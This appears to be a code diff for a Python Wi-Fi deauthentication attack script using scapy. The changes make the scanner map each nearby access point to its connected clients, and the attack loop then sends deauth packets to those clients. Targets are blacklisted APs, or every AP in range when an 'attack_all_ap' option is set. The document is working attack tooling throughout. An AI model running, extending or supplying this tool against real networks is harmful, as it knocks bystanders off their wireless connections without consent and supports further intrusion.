@@ -3,7 +3,7 @@ import subprocess
 import time
 import sys
 import os
-from typing import List, Tuple
+from typing import List, Tuple, Dict
 from loguru import logger
 import concurrent.futures
 from scapy.all import sniff, sendp #, RadioTap, Dot11, Dot11Deauth, Dot11Elt
@@ -69,35 +69,36 @@ def set_channel(interface: str, channel: int) -> None:
         logger.error(f"Failed to set channel {channel} on {interface}: {e}")
 
 
-def scan_networks(interface: str) -> Tuple[List[Tuple[str, str]], List[str]]:
+def scan_networks(interface: str, scan_wait: int) -> Dict[str, Tuple[str, List[str]]]:
     """
     Scans for networks and connected clients on the specified interface.
-    
-    :param interface: The name of the wireless interface.
-    :return: A tuple containing a list of APs (each as a tuple of SSID and BSSID) and a list of client MAC addresses.
-    """
-    ap_list: List[Tuple[str, str]] = []
-    client_list: List[str] = []
 
-    def packet_handler(pkt) -> None:
+    :param interface: The name of the wireless interface.
+    :param scan_wait: Time to scan in seconds.
+    :return: A dictionary where the key is the BSSID, and the value is a tuple containing 
+             the SSID and a list of client MAC addresses.
+    """
+    ap_clients_dict: Dict[str, Tuple[str, List[str]]] = {}
+
+    def packet_handler(pkt):
         if pkt.haslayer(Dot11):
-            bssid = pkt.addr2.lower() if pkt.addr2 else ''
             if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                 ssid = pkt.info.decode() if pkt.haslayer(Dot11Elt) else ''
-                if (ssid, bssid) not in ap_list:
-                    ap_list.append((ssid, bssid))
-            elif pkt.type == 2 and pkt.addr3 == bssid:  # Data frames
-                client = pkt.addr1.lower() if pkt.addr1 and ':' in pkt.addr1 else pkt.addr2.lower()
-                if client not in client_list:
-                    client_list.append(client)
+                bssid = pkt.addr2.lower() if pkt.addr2 else ''
+                if bssid and bssid not in ap_clients_dict:
+                    ap_clients_dict[bssid] = (ssid, [])
+            elif pkt.type == 2 and pkt.addr3:  # Data frames
+                bssid = pkt.addr3.lower()
+                client = pkt.addr1.lower() if pkt.addr1 != bssid and ':' in pkt.addr1 else pkt.addr2.lower()
+                if bssid in ap_clients_dict and client not in ap_clients_dict[bssid][1]:
+                    ap_clients_dict[bssid][1].append(client)
 
     try:
         logger.info(f"Scanning networks on {interface}")
-        sniff(iface=interface, prn=packet_handler, timeout=args.scan_wait, store=0)
+        sniff(iface=interface, prn=packet_handler, timeout=scan_wait, store=0)
     except Exception as e:
         logger.error(f"Error while scanning networks: {e}")
-        # TODO fix [Errno 1] Operation not permitted
-    return ap_list, client_list
+    return ap_clients_dict
 
 
 def create_deauth_packet(target: str, bssid: str, reason: int) -> RadioTap:
@@ -151,22 +152,22 @@ def deauth_process() -> None:
 
             start_time = time.time()
             with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
-                future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1)
+                future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1, args.scan_wait)
                 
-                while (time.time() - start_time) < args.channel_wait: # TODO May be this should be replaced with repeat_times
+                while (time.time() - start_time) < args.channel_wait:
                     if future_scan.done():
                         try:
-                            ap_list, client_list = future_scan.result()
-                            logger.info(f"Found {len(ap_list)} APs and {len(client_list)} clients on channel {channel}")
+                            ap_clients_dict = future_scan.result()
+                            logger.info(f"Found {len(ap_clients_dict)} APs with associated clients on channel {channel}")
 
-                            for ssid, bssid in ap_list:
-                                logger.debug(f"Checking if SSID:{ssid} BSSID:{bssid} should be deauthorized")
-                                if (bssid in args.whitelist_ap) or (ssid in args.whitelist_ap):
+                            for bssid, (ssid, clients) in ap_clients_dict.items():
+                                logger.debug(f"Checking AP SSID:{ssid} BSSID:{bssid}")
+                                if bssid in args.whitelist_ap or ssid in args.whitelist_ap:
                                     logger.info(f"AP SSID:{ssid} BSSID:{bssid} is in whitelist")
                                     continue
-                                if args.attack_all_ap or (bssid.lower() in args.blacklist_ap or ssid in args.blacklist_ap):
-                                    logger.debug(f"Found AP SSID:{ssid} BSSID:{bssid} to attack")
-                                    for client in client_list:
+                                if args.attack_all_ap or bssid.lower() in args.blacklist_ap or ssid in args.blacklist_ap:
+                                    logger.debug(f"AP SSID:{ssid} BSSID:{bssid} will be attacked")
+                                    for client in clients:
                                         logger.debug(f"Checking if Client:{client} should be deauthorized")
                                         if client in args.whitelist_client:
                                             logger.info(f"Client:{client} is in whitelist")
@@ -175,7 +176,8 @@ def deauth_process() -> None:
                                             logger.warning(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
                                             executor.submit(send_deauth_packets, INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.deauth_reasons, seq=args.deauth_seq)
 
-                            future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1)  # Resubmit the scanning task
+                            # Reschedule scan
+                            future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1, args.scan_wait)
                         except Exception as e:
                             logger.error(f"Error in future result: {e}")
 
